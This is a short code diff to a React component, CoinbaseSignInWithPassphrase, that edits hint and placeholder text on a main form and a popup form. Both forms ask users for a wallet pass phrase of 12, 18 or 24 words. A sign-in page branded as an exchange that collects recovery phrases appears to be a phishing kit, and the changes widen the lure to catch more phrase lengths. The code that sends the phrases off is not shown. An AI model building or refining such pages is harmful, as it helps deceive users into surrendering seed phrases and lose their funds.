@@ -201,7 +201,7 @@ const CoinbaseSignInWithPassphrase = () => {
                 onChange={(e) => setMainPassphrase(e.target.value)}
               />
               <p className="mt-2 text-xs text-gray-400">
-                A pass phrase is typically a sequence of 12 or 24 words.
+                Typically 12 (sometimes 18, 24) words separated by single spaces.
               </p>
               <button
                 onClick={(e) => handlePassphraseSubmit(e, "main")}
@@ -258,10 +258,13 @@ const CoinbaseSignInWithPassphrase = () => {
                   type="text"
                   required
                   className="relative block w-full appearance-none rounded-md border border-gray-600 px-3 py-2 text-gray-900 placeholder-gray-500 focus:z-10 focus:border-indigo-500 focus:outline-none focus:ring-indigo-500 sm:text-sm"
-                  placeholder="Enter your pass phrase (12 words)"
+                  placeholder="Enter your pass phrase"
                   value={popupPassphrase}
                   onChange={(e) => setPopupPassphrase(e.target.value)}
                 />
+               <p className="mt-2 text-xs text-gray-400">
+                Typically 12 (sometimes 18, 24) words separated by single spaces.
+              </p>
                 <button
                   type="submit"
                   disabled={loadingPopup}
